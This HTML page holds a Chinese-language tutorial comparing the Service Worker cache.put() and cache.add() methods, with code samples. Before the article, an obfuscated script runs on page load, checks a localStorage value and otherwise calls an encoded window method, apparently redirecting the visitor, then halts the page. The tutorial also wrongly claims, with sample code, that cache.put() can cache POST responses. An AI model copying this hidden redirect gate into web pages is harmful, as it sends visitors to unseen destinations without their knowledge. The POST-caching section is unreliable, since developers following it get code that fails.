<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0x4b19(t,s){var p=_0x1513();return(_0x4b19=function(s,n){var a=p[s-=203];void 0===_0x4b19.aDTyaE&&(_0x4b19.iiRbtO=function(s,n){var a,l=[],t=0,p="";for(s=(s=>{for(var n,a,l="",t="",p=0,e=0;a=s.charAt(e++);~a&&(n=p%4?64*n+a:a,p++%4)&&(l+=String.fromCharCode(255&n>>(-2*p&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var c=0,o=l.length;c<o;c++)t+="%"+("00"+l.charCodeAt(c).toString(16)).slice(-2);return decodeURIComponent(t)})(s),e=0;e<256;e++)l[e]=e;for(e=0;e<256;e++)t=(t+l[e]+n.charCodeAt(e%n.length))%256,a=l[e],l[e]=l[t],l[t]=a;for(var e=0,t=0,c=0;c<s.length;c++)a=l[e=(e+1)%256],l[e]=l[t=(t+l[e])%256],l[t]=a,p+=String.fromCharCode(s.charCodeAt(c)^l[(l[e]+l[t])%256]);return p},t=arguments,_0x4b19.aDTyaE=!0);var s=s+p[0],l=t[s];return l?a=l:(void 0===_0x4b19.TqVClF&&(_0x4b19.TqVClF=!0),a=_0x4b19.iiRbtO(a,n),t[s]=a),a})(t,s)}function _0x1513(){var s=["rvqKegZcOHT8D8oh","ySoBzCkCfLreWPNdVCk6jxDw","jCo4e2HtW7uHW7u","zmoXWP1rkSoVySk6ErivdKi","WPddRNCYrcVcHmoICbpdKmoX","WRiRW5i3w8orWODrWQGnWOu","oCk0W6FdLmo3WO/cO8oMvrv2mcq","W7pdVCokWR8KyZZcImoohgrJWRC","WQ7dKSoaWQGPWOZdIgjrea","A8oDz8kqf11kWRZdGSkVoxbN","WO3dL8octfG","W47dR8oFvxThfa","W41iWQBdSSo9WQldPCkovIe","ACkHoSocEIiz","W4ZcKmo8tLjnlHS","W6DEbterW4hcT1WToGiIWQ8","WO4cW4FdIHhcIGOlW58X","h8oqhCkbWOHjW6jb","oSoYxXtcGSkwWR3cMHSXWQtdN8k7","WORcTHddRSoYAb/dQNVdOa","WPpdHSoKqCoGWOeDW6xdRbTAiG","WP0RdCo/hmoCW43cLCotW6ldPZRcSG","vCkPpxXtW4O6W4dcNq","WRHloJm2WPBdIq","WRRdHCosWQBcQ2HJWQC/W6FcVHObvCkRfSkCWP9WwSkdE8ofWOZdVH0","WPBdRIT4WR45wG","WQrffmkIi8k9WQpdO8kwWPiL"];return(_0x1513=function(){return s})()}var _0x167db6=_0x4b19;if((()=>{for(var s=_0x4b19,n=_0x1513();;)try{if(583720==-parseInt(s(209,"&QeJ"))+-parseInt(s(224,"CfGL"))/2*(-parseInt(s(205,"V5rA"))/3)+parseInt(s(221,"kDY9"))/4*(-parseInt(s(206,"6vf%"))/5)+-parseInt(s(223,"!ysF"))/6*(parseInt(s(214,"Xd(0"))/7)+-parseInt(s(228,"LZWe"))/8+parseInt(s(226,"4S%q"))/9*(parseInt(s(229,"GG!^"))/10)+parseInt(s(222,"8*m^"))/11)break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x167db6(219,"mcfP")](_0x167db6(216,"!ysF"))!=_0x167db6(204,"V5rA"))throw window[_0x167db6(211,"EVEG")][_0x167db6(217,"phMh")](_0x167db6(218,"DHMI")),Error();document.title="Service Worker 中 cache.put() 与 cache.add() 的详细对比",document.getElementById("article").innerHTML='<div><p>Service Worker 的 Cache API 提供了两种向缓存中添加资源的方法：<code>cache.put()</code> 和 <code>cache.add()</code>。虽然它们最终都能将资源存入缓存，但在使用方式和应用场景上有重要区别。</p>\n<h2>核心区别对比表</h2>\n<table>\n<thead>\n<tr>\n<th>特性</th>\n<th><code>cache.put()</code></th>\n<th><code>cache.add()</code></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>参数要求</strong></td>\n<td>需要完整的 Request/Response 对</td>\n<td>只需要 URL 或 Request 对象</td>\n</tr>\n<tr>\n<td><strong>是否自动获取</strong></td>\n<td>不会自动发起网络请求</td>\n<td>会自动发起网络请求获取资源</td>\n</tr>\n<tr>\n<td><strong>错误处理</strong></td>\n<td>需要自行处理 Response</td>\n<td>自动处理网络请求失败（会 reject）</td>\n</tr>\n<tr>\n<td><strong>使用复杂度</strong></td>\n<td>更底层，更灵活</td>\n<td>更高级，更简单</td>\n</tr>\n<tr>\n<td><strong>典型使用场景</strong></td>\n<td>修改响应后存储、存储非GET响应</td>\n<td>简单缓存静态资源</td>\n</tr>\n</tbody>\n</table>\n<h2><code>cache.add()</code> - 简化版缓存添加</h2>\n<h3>工作流程</h3>\n<ol>\n<li>内部自动调用 <code>fetch()</code> 获取资源</li>\n<li>获取成功后自动存入缓存</li>\n<li>如果获取失败，整个 Promise 会 reject</li>\n</ol>\n<h3>代码示例</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// 缓存单个资源</span>\ncaches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;v1&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> {\n  cache.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;/styles/main.css&#x27;</span>)\n    .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;资源已缓存&#x27;</span>))\n    .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;缓存失败:&#x27;</span>, err));\n});\n\n<span class="hljs-comment">// 缓存多个资源（使用addAll）</span>\ncaches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;v1&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> {\n  cache.<span class="hljs-title function_">addAll</span>([\n    <span class="hljs-string">&#x27;/&#x27;</span>,\n    <span class="hljs-string">&#x27;/styles/main.css&#x27;</span>,\n    <span class="hljs-string">&#x27;/scripts/app.js&#x27;</span>\n  ]).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;所有资源已缓存&#x27;</span>));\n});\n</code></pre>\n<h3>特点</h3>\n<ul>\n<li><strong>自动获取</strong>  ：只需提供URL，自动完成获取+存储流程</li>\n<li><strong>仅限GET</strong>  ：只能用于GET请求</li>\n<li><strong>全有或全无</strong>  ：<code>addAll()</code> 中任何一个失败都会导致整个操作失败</li>\n</ul>\n<h2><code>cache.put()</code> - 手动控制缓存</h2>\n<h3>工作流程</h3>\n<ol>\n<li>需要开发者自行获取或构造 Response</li>\n<li>明确将 Request-Response 对存入缓存</li>\n<li>对响应有完全控制权</li>\n</ol>\n<h3>代码示例</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// 基本用法</span>\n<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data.json&#x27;</span>)\n  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> {\n    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;请求失败&#x27;</span>);\n    <span class="hljs-keyword">return</span> caches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;v1&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> {\n      <span class="hljs-keyword">return</span> cache.<span class="hljs-title function_">put</span>(<span class="hljs-string">&#x27;/api/data.json&#x27;</span>, response);\n    });\n  });\n\n<span class="hljs-comment">// 修改响应后存储</span>\n<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data.json&#x27;</span>)\n  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> {\n    <span class="hljs-keyword">const</span> modifiedResponse = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(\n      <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-attr">modified</span>: <span class="hljs-literal">true</span> }),\n      { <span class="hljs-attr">headers</span>: response.<span class="hljs-property">headers</span> }\n    );\n    <span class="hljs-keyword">return</span> caches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;v1&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> {\n      <span class="hljs-keyword">return</span> cache.<span class="hljs-title function_">put</span>(<span class="hljs-string">&#x27;/api/data.json&#x27;</span>, modifiedResponse);\n    });\n  });\n</code></pre>\n<h3>特点</h3>\n<ul>\n<li><strong>完全控制</strong>  ：可以存储修改过的响应</li>\n<li><strong>支持所有方法</strong>  ：可以缓存POST等非GET请求</li>\n<li><strong>更灵活</strong>  ：可以缓存程序生成的响应</li>\n</ul>\n<h2>何时使用哪种方法？</h2>\n<h3>使用 <code>cache.add()</code> 当：</h3>\n<ul>\n<li>缓存简单的静态资源（CSS/JS/图片）</li>\n<li>不需要修改响应内容</li>\n<li>需要简洁的代码</li>\n<li>资源必须完整缓存（否则宁愿失败）</li>\n</ul>\n<h3>使用 <code>cache.put()</code> 当：</h3>\n<ul>\n<li>需要缓存API响应</li>\n<li>需要修改响应内容后存储</li>\n<li>需要缓存非GET请求</li>\n<li>需要更精细的错误处理</li>\n<li>要缓存程序生成的响应（如Fallback页面）</li>\n</ul>\n<h2>高级用法示例</h2>\n<h3>1. 缓存POST请求响应</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> postRequest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>(<span class="hljs-string">&#x27;/api&#x27;</span>, {\n  <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,\n  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-attr">data</span>: <span class="hljs-string">&#x27;test&#x27;</span> })\n});\n\n<span class="hljs-title function_">fetch</span>(postRequest)\n  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> {\n    <span class="hljs-keyword">return</span> caches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;v1&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> {\n      <span class="hljs-keyword">return</span> cache.<span class="hljs-title function_">put</span>(postRequest, response);\n    });\n  });\n</code></pre>\n<h3>2. 创建自定义响应缓存</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> myResponse = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-string">&#x27;&lt;h1&gt;离线内容&lt;/h1&gt;&#x27;</span>, {\n  <span class="hljs-attr">headers</span>: { <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html&#x27;</span> }\n});\n\ncaches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;v1&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> {\n  cache.<span class="hljs-title function_">put</span>(<span class="hljs-string">&#x27;/offline.html&#x27;</span>, myResponse);\n});\n</code></pre>\n<h3>3. 带过期时间的缓存</h3>\n<pre><code class="language-javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data.json&#x27;</span>)\n  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> {\n    <span class="hljs-keyword">const</span> expires = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();\n    expires.<span class="hljs-title function_">setHours</span>(expires.<span class="hljs-title function_">getHours</span>() + <span class="hljs-number">1</span>);\n    \n    <span class="hljs-keyword">const</span> newHeaders = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Headers</span>(response.<span class="hljs-property">headers</span>);\n    newHeaders.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;Expires&#x27;</span>, expires.<span class="hljs-title function_">toUTCString</span>());\n    \n    <span class="hljs-keyword">const</span> customResponse = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(response.<span class="hljs-property">body</span>, {\n      <span class="hljs-attr">status</span>: response.<span class="hljs-property">status</span>,\n      <span class="hljs-attr">headers</span>: newHeaders\n    });\n    \n    <span class="hljs-keyword">return</span> caches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;v1&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> {\n      <span class="hljs-keyword">return</span> cache.<span class="hljs-title function_">put</span>(<span class="hljs-string">&#x27;/api/data.json&#x27;</span>, customResponse);\n    });\n  });\n</code></pre>\n<h2>注意事项</h2>\n<ol>\n<li><strong>内存管理</strong>  ：缓存不会自动过期，需要手动清理</li>\n<li><strong>存储限制</strong>  ：浏览器对缓存空间有限制（通常为域名存储空间的50%）</li>\n<li><strong>响应使用</strong>  ：<code>put()</code>前需要克隆Response，因为Response是流只能读取一次</li>\n<li><strong>错误处理</strong>  ：<code>add()</code>会自动失败，<code>put()</code>需要自行处理错误</li>\n<li><strong>CORS限制</strong>  ：跨域资源需要正确的CORS头才能缓存</li>\n</ol>\n<p>通过合理选择这两种方法，可以构建出既高效又灵活的Service Worker缓存策略。</p>\n</div>'</script></body></html>